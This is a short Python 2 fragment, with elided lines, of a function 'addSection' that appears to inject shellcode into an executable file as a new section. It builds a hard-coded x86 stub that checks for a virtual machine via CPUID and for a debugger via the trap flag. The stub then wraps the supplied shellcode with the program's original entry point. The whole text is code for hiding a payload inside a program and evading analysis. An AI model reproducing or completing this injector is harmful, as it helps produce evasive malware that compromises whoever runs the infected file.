...
def addSection(path,shellcode):
    ...
    print o_oep
    shellcode= b'\x31\xC0\xB8\x00\x00\x00\x40\x0F\xA2\x81\xF9\x72\x65\x56\x4D\x74\x0E\x16\x17\x9C\xF6\x44\x24\x01\x01\x75\x03\x9D\xEB\x08\x9D\xB8'+o_oep+shellcode+ o_oep
